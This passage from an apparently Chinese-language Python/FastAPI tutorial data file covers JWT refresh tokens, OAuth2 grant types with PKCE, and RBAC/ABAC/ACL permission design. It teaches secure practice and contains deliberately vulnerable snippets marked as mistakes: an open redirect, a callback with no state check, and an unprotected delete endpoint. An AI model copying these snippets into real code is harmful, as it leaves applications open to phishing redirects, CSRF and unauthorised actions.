        if not jti or not refresh_tokens.get(f"refresh:{jti}"):
            raise HTTPException(401, "Refresh Token无效")

        # （可选）Refresh Token轮换：吊销旧Token，颁发新Token
        refresh_tokens.delete(f"refresh:{jti}")

        user = get_user_by_id(user_id)
        if not user:
            raise HTTPException(401, "用户不存在")

        # 颁发新Token对
        new_access = create_access_token({"user_id": user.id, "username": user.username, "role": user.role})
        new_refresh = create_refresh_token({"user_id": user.id})
        new_jti = jwt.decode(new_refresh, SECRET_KEY, algorithms=[ALGORITHM])["jti"]
        refresh_tokens.setex(f"refresh:{new_jti}", REFRESH_TOKEN_EXPIRE_DAYS * 86400, str(user.id))

        return Token(access_token=new_access, refresh_token=new_refresh)

    except JWTError:
        raise HTTPException(401, "Refresh Token无效")
\`\`\`

---

## 五、最佳实践与常见坑点

### 5.1 JWT最佳实践

1. **使用强密钥**：HS256密钥至少32字节随机字符串
2. **短过期时间**：Access Token 15-30分钟
3. **HTTPS传输**：Token绝不通过HTTP发送
4. **不在Payload存敏感数据**：Payload是Base64编码，不是加密
5. **验证所有必要声明**：exp、iss、aud等
6. **指定算法白名单**：algorithms参数明确指定
7. **Refresh Token安全存储**：HttpOnly Cookie
8. **实现Token吊销机制**：黑名单
9. **防范CSRF/XSS**：根据存储方式采取对应措施

\`\`\`python
# 安全配置清单
JWT_CONFIG = {
    "secret_key": secrets.token_urlsafe(64),  # 从环境变量读取！
    "algorithm": "HS256",  # 或RS256
    "access_token_expire": timedelta(minutes=15),
    "refresh_token_expire": timedelta(days=7),
    "issuer": "your-app-name",
    "audience": "your-api",
    "blacklist_enabled": True,
    "cookie_secure": True,
    "cookie_httponly": True,
    "cookie_samesite": "lax",
}
\`\`\`

### 5.2 常见坑点

**坑点1：Payload存敏感数据**

\`\`\`python
# 错误：Payload是公开的（仅Base64编码，非加密）
token = create_access_token({
    "user_id": 1,
    "password": "123456",  # ❌ 任何人都能解码看到！
    "credit_card": "1234-5678-9012-3456"
})

# 正确：只存非敏感标识
token = create_access_token({
    "user_id": 1,
    "username": "zhangsan",
    "role": "user"
})
\`\`\`

**坑点2：不验证算法**

\`\`\`python
# 错误：可能被alg:none攻击
jwt.decode(token, SECRET_KEY)  # 默认接受多种算法？不，python-jose需要指定algorithms

# 正确：明确指定算法
jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
\`\`\`

**坑点3：Access Token过期时间太长**

\`\`\`python
# 错误：过期时间太长，泄露后风险大
create_access_token(data, expires_delta=timedelta(days=30))  # 30天！

# 正确：短过期+Refresh Token
create_access_token(data, expires_delta=timedelta(minutes=15))  # 15分钟
create_refresh_token(data)  # 7天，可吊销
\`\`\`
`
  },
  {
    id: "pyb-15-4",
    group: "认证授权与安全",
    icon: "🔐",
    title: "OAuth2.0协议",
    content: `

# OAuth2.0协议

## 一、OAuth2.0核心概念

### 1.1 角色定义

| 角色 | 英文 | 说明 | 示例 |
|------|------|------|------|
| 资源所有者 | Resource Owner | 用户，能授权访问资源 | 你（Google用户） |
| 客户端 | Client | 第三方应用，请求访问资源 | 某网站想用你的Google账号登录 |
| 授权服务器 | Authorization Server | 认证服务器，颁发Token | Google Accounts |
| 资源服务器 | Resource Server | 存储用户资源的服务器 | Google APIs |

### 1.2 协议流程

\`\`\`
┌────────┐
│ 用户   │───┐
└────────┘   │ 1. 用户点击"使用Google登录"
     │       ▼
     │   ┌────────┐
     │   │ 客户端  │（第三方网站）
     │   └────────┘
     │       │
     │       │ 2. 重定向到Google授权页
     │       │    GET https://accounts.google.com/oauth/authorize?
     │       │        client_id=xxx&
     │       │        redirect_uri=xxx&
     │       │        response_type=code&
     │       │        scope=email profile&
     │       │        state=xyz123
     │       ▼
     │   ┌────────────────┐
     │   │  授权服务器     │（Google）
     │   └────────────────┘
     │       │
     │ 3. 用户登录并同意授权
     │       │
     │ 4. 重定向回客户端，携带授权码code
     │       │    Location: https://client.com/callback?code=abc&state=xyz123
     │       ▼
     │   ┌────────┐
     └──▶│ 客户端  │
         └────────┘
              │ 5. 用code换Access Token
              │    POST https://oauth2.googleapis.com/token
              │    client_id+client_secret+code+redirect_uri
              ▼
         ┌────────────────┐
         │  授权服务器     │
         └────────────────┘
              │ 6. 返回Access Token（+可选Refresh Token）
              ▼
         ┌────────┐
         │ 客户端  │───┐
         └────────┘   │ 7. 用Token访问用户资源
                      ▼
                  ┌────────┐
                  │资源服务器│（Google API）
                  └────────┘
\`\`\`

---

## 二、四种授权模式

### 2.1 授权码模式（Authorization Code）

最安全、最常用的模式，适用于有后端的Web应用。

| 步骤 | 描述 |
|------|------|
| 1 | 客户端重定向用户到授权页 |
| 2 | 用户登录授权，返回code（通过重定向） |
| 3 | 客户端用code向Token端点换Token（后端请求，包含secret） |

\`\`\`python
from fastapi import FastAPI, Request, HTTPException
import httpx
import secrets
from urllib.parse import urlencode

app = FastAPI()

# OAuth配置（以GitHub为例）
GITHUB_CLIENT_ID = "your-github-client-id"
GITHUB_CLIENT_SECRET = "your-github-client-secret"
GITHUB_AUTHORIZE_URL = "https://github.com/login/oauth/authorize"
GITHUB_TOKEN_URL = "https://github.com/login/oauth/access_token"
GITHUB_API_URL = "https://api.github.com"
REDIRECT_URI = "http://localhost:8000/auth/github/callback"

# 存储state防CSRF
states = set()

@app.get("/auth/github/login")
async def github_login():
    """第一步：重定向到GitHub授权页"""
    state = secrets.token_urlsafe(32)
    states.add(state)

    params = {
        "client_id": GITHUB_CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
        "scope": "user:email",
        "state": state,
        "response_type": "code"
    }
    auth_url = f"{GITHUB_AUTHORIZE_URL}?{urlencode(params)}"
    return {"redirect_url": auth_url}

@app.get("/auth/github/callback")
async def github_callback(code: str, state: str, error: str = None):
    """第二步：处理回调，用code换Token"""
    if error:
        raise HTTPException(400, f"授权失败: {error}")

    if state not in states:
        raise HTTPException(400, "无效state")
    states.discard(state)

    # 第三步：用code换access_token（后端请求）
    async with httpx.AsyncClient() as client:
        response = await client.post(
            GITHUB_TOKEN_URL,
            data={
                "client_id": GITHUB_CLIENT_ID,
                "client_secret": GITHUB_CLIENT_SECRET,
                "code": code,
                "redirect_uri": REDIRECT_URI
            },
            headers={"Accept": "application/json"}
        )
        token_data = response.json()

    if "error" in token_data:
        raise HTTPException(400, f"获取Token失败: {token_data}")

    access_token = token_data["access_token"]

    # 第四步：用Token获取用户信息
    async with httpx.AsyncClient() as client:
        response = await client.get(
            f"{GITHUB_API_URL}/user",
            headers={"Authorization": f"token {access_token}"}
        )
        user_info = response.json()

    # 登录/注册逻辑
    user = get_or_create_user(
        provider="github",
        provider_user_id=str(user_info["id"]),
        username=user_info["login"],
        email=user_info.get("email"),
        avatar=user_info.get("avatar_url")
    )

    # 生成自己的JWT
    jwt_token = create_access_token({"user_id": user.id})
    return {"access_token": jwt_token, "user": user}
\`\`\`

### 2.2 隐式模式（Implicit）- 已废弃

⚠️ OAuth 2.1已移除此模式，不推荐使用。
- 直接在URL片段返回Token（无code）
- 安全性低，Token暴露在URL/浏览器历史

### 2.3 密码模式（Resource Owner Password Credentials）

用户直接将用户名密码给客户端，客户端换Token。
- 适用于高度信任的客户端（如官方App）
- 不推荐第三方应用使用

\`\`\`python
@app.post("/token/password")
async def password_grant(username: str, password: str):
    user = authenticate_user(username, password)
    if not user:
        raise HTTPException(401, "用户名或密码错误")

    access_token = create_access_token({"user_id": user.id})
    return {"access_token": access_token, "token_type": "bearer"}
\`\`\`

### 2.4 客户端凭证模式（Client Credentials）

用于服务间调用，无用户参与。

\`\`\`python
@app.post("/token/client")
async def client_credentials_grant(
    client_id: str,
    client_secret: str,
    grant_type: str = "client_credentials"
):
    # 验证客户端凭证
    client = verify_client(client_id, client_secret)
    if not client:
        raise HTTPException(401, "客户端凭证无效")

    # 返回应用级Token（无用户信息）
    access_token = create_access_token({
        "client_id": client_id,
        "scope": client.allowed_scopes,
        "type": "client"
    })
    return {"access_token": access_token, "token_type": "bearer"}
\`\`\`

### 2.5 模式对比表

| 模式 | 适用场景 | Access Token位置 | 安全性 |
|------|---------|-----------------|--------|
| 授权码 | 有后端Web应用 | 后端获取（不暴露给浏览器） | 高 |
| PKCE增强授权码 | 移动端/SPA（无后端） | 前端获取，但PKCE保护 | 高 |
| 隐式 | ❌ 已废弃 | URL片段 | 低 |
| 密码 | 高信任官方客户端 | 后端 | 中 |
| 客户端凭证 | 服务间调用 | 服务端 | 高 |

---

## 三、PKCE增强

### 3.1 PKCE解决的问题

针对移动端/SPA（无法安全存储client_secret）的场景，防止授权码被截获。

\`\`\`
传统授权码问题：
- 第三方App通过自定义Scheme接收回调
- 恶意App可以注册相同Scheme截获code

PKCE流程：
1. 客户端生成code_verifier（随机字符串）
2. 计算code_challenge = SHA256(code_verifier)的Base64URL
3. 授权请求时携带code_challenge
4. 换Token时携带code_verifier
5. 服务器验证：SHA256(code_verifier) == code_challenge
\`\`\`

\`\`\`python
import base64
import hashlib
import secrets
import httpx

def generate_pkce_pair():
    """生成PKCE code_verifier和code_challenge"""
    code_verifier = secrets.token_urlsafe(64)
    code_challenge = base64.urlsafe_b64encode(
        hashlib.sha256(code_verifier.encode()).digest()
    ).rstrip(b"=").decode()
    return code_verifier, code_challenge

# 前端/移动端：发起授权前生成
code_verifier, code_challenge = generate_pkce_pair()
# 存储code_verifier（localStorage/memory）

# 授权请求
params = {
    "client_id": CLIENT_ID,
    "redirect_uri": REDIRECT_URI,
    "response_type": "code",
    "code_challenge": code_challenge,
    "code_challenge_method": "S256",  # SHA256
    "scope": "openid email",
}
# 重定向到授权页

# 换Token时（回调后）
async def exchange_code_with_pkce(code: str, code_verifier: str):
    async with httpx.AsyncClient() as client:
        response = await client.post(
            TOKEN_URL,
            data={
                "client_id": CLIENT_ID,
                "code": code,
                "redirect_uri": REDIRECT_URI,
                "grant_type": "authorization_code",
                "code_verifier": code_verifier,  # 关键：发送verifier
            }
        )
        return response.json()
\`\`\`

---

## 四、Authorization Code实战

### 4.1 Authlib库实现OAuth2客户端

\`\`\`python
# pip install authlib
from fastapi import FastAPI, Request, HTTPException
from authlib.integrations.starlette_client import OAuth
from starlette.config import Config
from starlette.middleware.sessions import SessionMiddleware

app = FastAPI()
app.add_middleware(SessionMiddleware, secret_key="your-secret")

# 配置OAuth
config = Config(".env")
oauth = OAuth(config)

oauth.register(
    name="google",
    server_metadata_url="https://accounts.google.com/.well-known/openid-configuration",
    client_kwargs={"scope": "openid email profile"},
)

oauth.register(
    name="github",
    client_id=config("GITHUB_CLIENT_ID"),
    client_secret=config("GITHUB_CLIENT_SECRET"),
    access_token_url="https://github.com/login/oauth/access_token",
    authorize_url="https://github.com/login/oauth/authorize",
    api_base_url="https://api.github.com/",
    client_kwargs={"scope": "user:email"},
)

@app.get("/login/{provider}")
async def login(provider: str, request: Request):
    redirect_uri = request.url_for("auth_callback", provider=provider)
    client = oauth.create_client(provider)
    return await client.authorize_redirect(request, redirect_uri)

@app.get("/auth/{provider}/callback")
async def auth_callback(provider: str, request: Request):
    client = oauth.create_client(provider)
    token = await client.authorize_access_token(request)

    # 获取用户信息
    if provider == "google":
        user_info = token.get("userinfo")
        if not user_info:
            resp = await client.get("userinfo", token=token)
            user_info = resp.json()
    else:
        resp = await client.get("user", token=token)
        user_info = resp.json()

    # 创建/登录用户
    user = get_or_create_user(
        provider=provider,
        provider_id=str(user_info.get("id") or user_info.get("sub")),
        email=user_info.get("email"),
        name=user_info.get("name") or user_info.get("login"),
        avatar=user_info.get("picture") or user_info.get("avatar_url")
    )

    # 生成JWT
    jwt_token = create_access_token({"user_id": user.id})
    return {"access_token": jwt_token}
\`\`\`

### 4.2 OAuth2授权服务器实现

\`\`\`python
# 使用Authlib实现OAuth2 Provider
from authlib.integrations.fastapi_oauth2 import AuthorizationServer, ResourceProtector
from authlib.oauth2.rfc6749 import grants
from authlib.oauth2 import OAuth2Request

# 授权码Grant
class AuthorizationCodeGrant(grants.AuthorizationCodeGrant):
    def save_authorization_code(self, code, request):
        return save_auth_code(code, request)

    def query_authorization_code(self, code, client):
        return get_auth_code(code, client)

    def delete_authorization_code(self, authorization_code):
        delete_auth_code(authorization_code)

    def authenticate_user(self, authorization_code):
        return get_user_by_id(authorization_code.user_id)

# 密码Grant（谨慎使用）
class PasswordGrant(grants.ResourceOwnerPasswordCredentialsGrant):
    def authenticate_user(self, username, password):
        user = get_user_by_username(username)
        if user and verify_password(password, user.password_hash):
            return user

# 刷新Token Grant
class RefreshTokenGrant(grants.RefreshTokenGrant):
    def authenticate_refresh_token(self, refresh_token):
        return get_refresh_token(refresh_token)

    def revoke_old_credential(self, credential):
        revoke_refresh_token(credential)

# 初始化服务器
server = AuthorizationServer()
server.register_grant(AuthorizationCodeGrant)
server.register_grant(PasswordGrant)
server.register_grant(RefreshTokenGrant)

@app.post("/oauth/token")
async def issue_token(request: Request):
    return await server.create_token_response(request)
\`\`\`

---

## 五、Refresh Token机制

### 5.1 安全存储Refresh Token

\`\`\`python
# Refresh Token应该：
# 1. 存储在HttpOnly Cookie中（Web）
# 2. 存储在安全存储中（移动端：Keychain/Keystore）
# 3. 可以被吊销
# 4. 支持轮换（Rotation）

@app.post("/auth/refresh")
async def refresh(request: Request):
    refresh_token = request.cookies.get("refresh_token")
    if not refresh_token:
        raise HTTPException(401, "无Refresh Token")

    try:
        payload = jwt.decode(refresh_token, REFRESH_SECRET, algorithms=["HS256"])
        jti = payload["jti"]

        # 检查是否在黑名单（已注销/轮换）
        if is_token_revoked(jti):
            raise HTTPException(401, "Refresh Token已作废")

        user_id = payload["user_id"]
        user = get_user_by_id(user_id)

        # Refresh Token轮换：作废旧Token，颁发新Token
        revoke_token(jti)
        token_pair = create_token_pair(user)

        response = JSONResponse({"access_token": token_pair["access_token"]})
        response.set_cookie(
            "refresh_token",
            token_pair["refresh_token"],
            httponly=True,
            secure=True,
            samesite="lax",
            max_age=7*24*3600
        )
        return response

    except JWTError:
        raise HTTPException(401, "无效Refresh Token")
\`\`\`

---

## 六、最佳实践与常见坑点

### 6.1 OAuth2最佳实践

1. **优先使用授权码模式+PKCE**（即使是SPA/移动端）
2. **State参数防CSRF**：随机字符串，回调时验证
3. **Redirect URI严格校验**：精确匹配，禁止开放重定向
4. **使用state参数**：防止CSRF
5. **Scope最小化**：只请求必要的权限
6. **HTTPS everywhere**：所有OAuth流程必须HTTPS
7. **Client Secret安全存储**：不放入前端代码
8. **Token安全存储**：Refresh Token用HttpOnly Cookie

### 6.2 常见坑点

**坑点1：Redirect URI校验不严格导致开放重定向**

\`\`\`python
# 错误：接受任意redirect_uri
@app.get("/authorize")
async def authorize(redirect_uri: str, ...):
    # 直接使用用户传入的redirect_uri
    return RedirectResponse(redirect_uri)  # 开放重定向！钓鱼风险

# 正确：白名单校验
ALLOWED_REDIRECT_URIS = {
    "https://app.example.com/callback",
    "https://app.example.com/auth/callback",
}

@app.get("/authorize")
async def authorize(redirect_uri: str, ...):
    if redirect_uri not in ALLOWED_REDIRECT_URIS:
        raise HTTPException(400, "非法的redirect_uri")
\`\`\`

**坑点2：不验证state参数导致CSRF**

\`\`\`python
# 错误：不验证state
@app.get("/callback")
async def callback(code: str, state: str = None):
    # 直接用code换token，不检查state
    pass

# 正确：验证state
@app.get("/callback")
async def callback(code: str, state: str, request: Request):
    saved_state = request.session.get("oauth_state")
    if not state or state != saved_state:
        raise HTTPException(400, "state不匹配，可能是CSRF攻击")
\`\`\`
`
  },
  {
    id: "pyb-15-5",
    group: "认证授权与安全",
    icon: "🔐",
    title: "权限模型设计",
    content: `

# 权限模型设计

## 一、权限模型概述

### 1.1 常见权限模型对比

| 模型 | 全称 | 复杂度 | 灵活性 | 适用场景 |
|------|------|--------|--------|---------|
| ACL | Access Control List | 低 | 低 | 简单系统、文件权限 |
| RBAC | Role-Based Access Control | 中 | 中 | 大多数业务系统 |
| ABAC | Attribute-Based Access Control | 高 | 高 | 复杂企业系统 |
| ReBAC | Relationship-Based Access Control | 高 | 高 | 社交、协作系统 |

---

## 二、RBAC基于角色的权限控制

### 2.1 RBAC核心概念

\`\`\`
用户(User) → 角色(Role) → 权限(Permission) → 资源(Resource)

用户被分配角色，角色拥有权限，权限决定能访问什么资源
\`\`\`

| 实体 | 说明 | 示例 |
|------|------|------|
| User | 系统用户 | zhangsan、lisi |
| Role | 角色 | admin、editor、viewer |
| Permission | 权限 | user:create、article:edit |
| Resource | 资源 | 用户、文章、订单 |

### 2.2 数据库设计

\`\`\`python
from sqlalchemy import Column, Integer, String, Boolean, ForeignKey, Table, DateTime
from sqlalchemy.orm import relationship
from sqlalchemy.ext.declarative import declarative_base
from datetime import datetime

Base = declarative_base()

# 用户-角色关联表（多对多）
user_roles = Table(
    "user_roles",
    Base.metadata,
    Column("user_id", Integer, ForeignKey("users.id"), primary_key=True),
    Column("role_id", Integer, ForeignKey("roles.id"), primary_key=True),
)

# 角色-权限关联表（多对多）
role_permissions = Table(
    "role_permissions",
    Base.metadata,
    Column("role_id", Integer, ForeignKey("roles.id"), primary_key=True),
    Column("permission_id", Integer, ForeignKey("permissions.id"), primary_key=True),
)

class User(Base):
    __tablename__ = "users"

    id = Column(Integer, primary_key=True)
    username = Column(String(50), unique=True, nullable=False)
    email = Column(String(100), unique=True, nullable=False)
    password_hash = Column(String(255), nullable=False)
    is_active = Column(Boolean, default=True)
    created_at = Column(DateTime, default=datetime.utcnow)

    roles = relationship("Role", secondary=user_roles, back_populates="users")

    def has_permission(self, permission_code: str) -> bool:
        """检查用户是否有某权限"""
        for role in self.roles:
            for perm in role.permissions:
                if perm.code == permission_code:
                    return True
        return False

    def has_role(self, role_code: str) -> bool:
        """检查用户是否有某角色"""
        return any(r.code == role_code for r in self.roles)

class Role(Base):
    __tablename__ = "roles"

    id = Column(Integer, primary_key=True)
    code = Column(String(50), unique=True, nullable=False)  # admin, editor
    name = Column(String(50), nullable=False)  # 管理员、编辑
    description = Column(String(255))
    is_system = Column(Boolean, default=False)  # 系统内置角色不可删除

    users = relationship("User", secondary=user_roles, back_populates="roles")
    permissions = relationship("Permission", secondary=role_permissions, back_populates="roles")

class Permission(Base):
    __tablename__ = "permissions"

    id = Column(Integer, primary_key=True)
    code = Column(String(100), unique=True, nullable=False)  # article:create
    name = Column(String(100), nullable=False)  # 创建文章
    module = Column(String(50))  # 所属模块：user, article, order
    description = Column(String(255))

    roles = relationship("Role", secondary=role_permissions, back_populates="permissions")
\`\`\`

### 2.3 权限初始化

\`\`\`python
def init_permissions(db):
    """初始化权限数据"""
    permissions = [
        # 用户模块
        {"code": "user:list", "name": "查看用户列表", "module": "user"},
        {"code": "user:create", "name": "创建用户", "module": "user"},
        {"code": "user:read", "name": "查看用户详情", "module": "user"},
        {"code": "user:update", "name": "更新用户", "module": "user"},
        {"code": "user:delete", "name": "删除用户", "module": "user"},
        # 文章模块
        {"code": "article:list", "name": "查看文章列表", "module": "article"},
        {"code": "article:create", "name": "创建文章", "module": "article"},
        {"code": "article:read", "name": "查看文章详情", "module": "article"},
        {"code": "article:update", "name": "更新文章", "module": "article"},
        {"code": "article:delete", "name": "删除文章", "module": "article"},
        {"code": "article:publish", "name": "发布文章", "module": "article"},
        # 订单模块
        {"code": "order:list", "name": "查看订单列表", "module": "order"},
        {"code": "order:read", "name": "查看订单详情", "module": "order"},
        {"code": "order:refund", "name": "退款操作", "module": "order"},
    ]

    for perm_data in permissions:
        perm = db.query(Permission).filter_by(code=perm_data["code"]).first()
        if not perm:
            perm = Permission(**perm_data)
            db.add(perm)

    # 创建角色
    admin_role = db.query(Role).filter_by(code="admin").first()
    if not admin_role:
        admin_role = Role(code="admin", name="超级管理员", is_system=True)
        admin_role.permissions = db.query(Permission).all()
        db.add(admin_role)

    editor_role = db.query(Role).filter_by(code="editor").first()
    if not editor_role:
        editor_role = Role(code="editor", name="编辑")
        editor_perms = db.query(Permission).filter(
            Permission.module.in_(["article"])
        ).all()
        editor_role.permissions = editor_perms
        db.add(editor_role)

    viewer_role = db.query(Role).filter_by(code="viewer").first()
    if not viewer_role:
        viewer_role = Role(code="viewer", name="访客")
        viewer_perms = db.query(Permission).filter(
            Permission.code.in_(["article:list", "article:read", "user:read"])
        ).all()
        viewer_role.permissions = viewer_perms
        db.add(viewer_role)

    db.commit()
\`\`\`

### 2.4 FastAPI权限依赖

\`\`\`python
from fastapi import Depends, HTTPException, status
from fastapi.security import OAuth2PasswordBearer

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

async def get_current_user(
    token: str = Depends(oauth2_scheme),
    db: Session = Depends(get_db)
) -> User:
    """获取当前登录用户"""
    payload = verify_token(token)
    user = db.query(User).get(payload.user_id)
    if not user or not user.is_active:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="无效的认证凭证"
        )
    return user

def require_permission(permission_code: str):
    """权限检查装饰器/依赖"""
    async def permission_checker(current_user: User = Depends(get_current_user)):
        if not current_user.has_permission(permission_code):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail=f"需要权限: {permission_code}"
            )
        return current_user
    return permission_checker

def require_role(role_code: str):
    """角色检查依赖"""
    async def role_checker(current_user: User = Depends(get_current_user)):
        if not current_user.has_role(role_code):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail=f"需要角色: {role_code}"
            )
        return current_user
    return role_checker

# 使用示例
@app.get("/users", dependencies=[Depends(require_permission("user:list"))])
async def list_users(db: Session = Depends(get_db)):
    return db.query(User).all()

@app.post("/users", dependencies=[Depends(require_permission("user:create"))])
async def create_user(user_data: UserCreate, db: Session = Depends(get_db)):
    pass

@app.delete("/users/{user_id}", dependencies=[Depends(require_role("admin"))])
async def delete_user(user_id: int, db: Session = Depends(get_db)):
    pass
\`\`\`

---

## 三、ABAC基于属性的权限控制

### 3.1 ABAC核心概念

ABAC根据属性（用户属性、资源属性、环境属性）动态判断权限：

\`\`\`
允许访问 if:
  user.department == resource.department
  AND user.clearance_level >= resource.required_level
  AND time.hour BETWEEN 9 AND 18
  AND ip IN corporate_network
\`\`\`

| 属性类型 | 示例 |
|---------|------|
| 用户属性 | 部门、职位、级别、年龄 |
| 资源属性 | 创建者、密级、部门、状态 |
| 环境属性 | 时间、IP、地理位置、设备 |
| 动作属性 | 读、写、删除、审批 |

### 3.2 ABAC实现示例

\`\`\`python
from typing import Callable, Any
from enum import Enum

class PolicyEffect(Enum):
    ALLOW = "allow"
    DENY = "deny"

class Policy:
    def __init__(
        self,
        name: str,
        effect: PolicyEffect,
        condition: Callable[[dict, dict, dict], bool],
        description: str = ""
    ):
        self.name = name
        self.effect = effect
        self.condition = condition
        self.description = description

class ABACEngine:
    def __init__(self):
        self.policies: List[Policy] = []

    def add_policy(self, policy: Policy):
        self.policies.append(policy)

    def is_allowed(
        self,
        subject: dict,  # 用户属性
        resource: dict,  # 资源属性
        action: str,     # 动作
        environment: dict = None  # 环境属性
    ) -> tuple[bool, str]:
        environment = environment or {}

        # 默认拒绝
        allowed = False
        matching_policy = None

        for policy in self.policies:
            try:
                if policy.condition(subject, resource, action, environment):
                    if policy.effect == PolicyEffect.DENY:
                        return False, f"被策略拒绝: {policy.name}"
                    allowed = True
                    matching_policy = policy.name
            except:
                continue

        if allowed:
            return True, f"允许访问 (策略: {matching_policy})"
        return False, "无匹配的允许策略"

# 定义策略
abac = ABACEngine()

# 1. 文章作者可以编辑自己的文章
abac.add_policy(Policy(
    name="article_owner_edit",
    effect=PolicyEffect.ALLOW,
    condition=lambda s, r, a, e: (
        a == "article:update"
        and r.get("type") == "article"
        and s.get("id") == r.get("author_id")
    ),
    description="文章作者可以编辑自己的文章"
))

# 2. 部门经理可以查看本部门的文档
abac.add_policy(Policy(
    name="dept_manager_read",
    effect=PolicyEffect.ALLOW,
    condition=lambda s, r, a, e: (
        a in ("document:read", "document:list")
        and s.get("role") == "manager"
        and s.get("department") == r.get("department")
    )
))

# 3. 工作时间之外禁止删除操作
abac.add_policy(Policy(
    name="work_hours_only",
    effect=PolicyEffect.DENY,
    condition=lambda s, r, a, e: (
        a == "document:delete"
        and (e.get("hour", 12) < 9 or e.get("hour", 12) > 18)
    )
))

# 4. 禁止外部IP访问管理接口
abac.add_policy(Policy(
    name="internal_only",
    effect=PolicyEffect.DENY,
    condition=lambda s, r, a, e: (
        r.get("type") == "admin"
        and not e.get("is_internal_ip", False)
    )
))

# 使用示例
from datetime import datetime

@app.get("/documents/{doc_id}")
async def get_document(
    doc_id: int,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
    request: Request = None
):
    doc = db.query(Document).get(doc_id)
    if not doc:
        raise HTTPException(404)

    subject = {
        "id": current_user.id,
        "role": current_user.role,
        "department": current_user.department,
    }
    resource = {
        "type": "document",
        "id": doc.id,
        "author_id": doc.author_id,
        "department": doc.department,
    }
    environment = {
        "hour": datetime.now().hour,
        "ip": request.client.host,
        "is_internal_ip": request.client.host.startswith("192.168."),
    }

    allowed, reason = abac.is_allowed(subject, resource, "document:read", environment)
    if not allowed:
        raise HTTPException(403, reason)

    return doc
\`\`\`

---

## 四、ACL访问控制列表

### 4.1 ACL简单实现

\`\`\`python
# ACL：针对每个资源维护可访问的用户/角色列表
class ResourceACL(Base):
    __tablename__ = "resource_acls"

    id = Column(Integer, primary_key=True)
    resource_type = Column(String(50), nullable=False)  # document, project
    resource_id = Column(Integer, nullable=False)
    subject_type = Column(String(20), nullable=False)  # user, role
    subject_id = Column(String(50), nullable=False)
    permissions = Column(String(200))  # "read,write,delete"

class ACLService:
    def __init__(self, db):
        self.db = db

    def grant(self, resource_type, resource_id, subject_type, subject_id, permissions):
        acl = self.db.query(ResourceACL).filter_by(
            resource_type=resource_type,
            resource_id=resource_id,
            subject_type=subject_type,
            subject_id=str(subject_id)
        ).first()

        if acl:
            acl.permissions = permissions
        else:
            acl = ResourceACL(
                resource_type=resource_type,
                resource_id=resource_id,
                subject_type=subject_type,
                subject_id=str(subject_id),
                permissions=permissions
            )
            self.db.add(acl)
        self.db.commit()

    def revoke(self, resource_type, resource_id, subject_type, subject_id):
        self.db.query(ResourceACL).filter_by(
            resource_type=resource_type,
            resource_id=resource_id,
            subject_type=subject_type,
            subject_id=str(subject_id)
        ).delete()
        self.db.commit()

    def check(self, user, resource_type, resource_id, permission) -> bool:
        # 检查用户直接权限
        user_acl = self.db.query(ResourceACL).filter_by(
            resource_type=resource_type,
            resource_id=resource_id,
            subject_type="user",
            subject_id=str(user.id)
        ).first()
        if user_acl and permission in user_acl.permissions.split(","):
            return True

        # 检查角色权限
        for role in user.roles:
            role_acl = self.db.query(ResourceACL).filter_by(
                resource_type=resource_type,
                resource_id=resource_id,
                subject_type="role",
                subject_id=str(role.code)
            ).first()
            if role_acl and permission in role_acl.permissions.split(","):
                return True

        return False
\`\`\`

---

## 五、Django Guardian对象级权限

### 5.1 对象级权限概念

RBAC通常是功能级权限（能做什么操作），对象级权限控制具体到某个资源（能对哪个具体资源做操作）。

\`\`\`python
# django-guardian风格
from functools import wraps

def object_permission_required(perm, lookup_param="id"):
    """对象级权限检查装饰器"""
    def decorator(func):
        @wraps(func)
        async def wrapper(*args, **kwargs):
            obj_id = kwargs.get(lookup_param)
            current_user = kwargs.get("current_user")
            db = kwargs.get("db")

            obj = db.query(Article).get(obj_id)
            if not obj:
                raise HTTPException(404)

            if not has_object_permission(current_user, perm, obj):
                raise HTTPException(403, "无此对象权限")

            kwargs["obj"] = obj
            return await func(*args, **kwargs)
        return wrapper
    return decorator

def has_object_permission(user, permission: str, obj) -> bool:
    """检查对象级权限"""
    # 超级管理员有所有权限
    if user.has_role("admin"):
        return True

    # 作者对自己的资源有所有权限
    if hasattr(obj, "author_id") and obj.author_id == user.id:
        return True

    # 检查ACL
    acl = get_object_acl(obj)
    return acl.check(user, permission)
\`\`\`

---

## 六、最佳实践与常见坑点

### 6.1 权限设计最佳实践

1. **最小权限原则**：默认无权限，按需授予
2. **权限粒度合理**：太粗不够灵活，太细难以管理
3. **使用角色而不是直接给用户授权**：便于批量管理
4. **超级管理员角色分离**：admin角色不应用于日常业务
5. **权限缓存**：权限数据不常变，适当缓存
6. **审计日志**：记录权限变更和访问
7. **前后端双重校验**：前端控制显示，后端校验权限

\`\`\`python
# 权限缓存示例
from functools import lru_cache
import redis

r = redis.from_url("redis://localhost")

def get_user_permissions(user_id: int) -> set:
    """带缓存的获取用户权限"""
    cache_key = f"user_perms:{user_id}"
    cached = r.get(cache_key)
    if cached:
        return set(json.loads(cached))

    user = db.query(User).get(user_id)
    perms = set()
    for role in user.roles:
        for perm in role.permissions:
            perms.add(perm.code)

    r.setex(cache_key, 300, json.dumps(list(perms)))  # 缓存5分钟
    return perms

def invalidate_user_perms(user_id: int):
    """权限变更时清除缓存"""
    r.delete(f"user_perms:{user_id}")
\`\`\`

### 6.2 常见坑点

**坑点1：权限校验只在前端做**

\`\`\`python
# 错误：后端不校验，仅靠前端隐藏按钮
# 攻击者可以直接构造请求
@app.delete("/users/{user_id}")
async def delete_user(user_id: int):
    delete_user_by_id(user_id)  # ❌ 没有权限检查！

# 正确：后端必须校验
@app.delete("/users/{user_id}", dependencies=[Depends(require_role("admin"))])
async def delete_user(user_id: int):
    delete_user_by_id(user_id)
\`\`\`

**坑点2：权限字符串硬编码到处写**

\`\`\`python
# 错误：硬编码字符串，容易写错
if current_user.has_permission("user:crate"):  # 拼写错误crate
    pass

# 正确：定义常量
class Permissions:
    USER_LIST = "user:list"
    USER_CREATE = "user:create"
    USER_READ = "user:read"
    USER_UPDATE = "user:update"
    USER_DELETE = "user:delete"

if current_user.has_permission(Permissions.USER_CREATE):
    pass
\`\`\`
`
  },
  {
    id: "pyb-15-6",
    group: "认证授权与安全",
    icon: "🔐",
    title: "Web安全防护",
    content: `

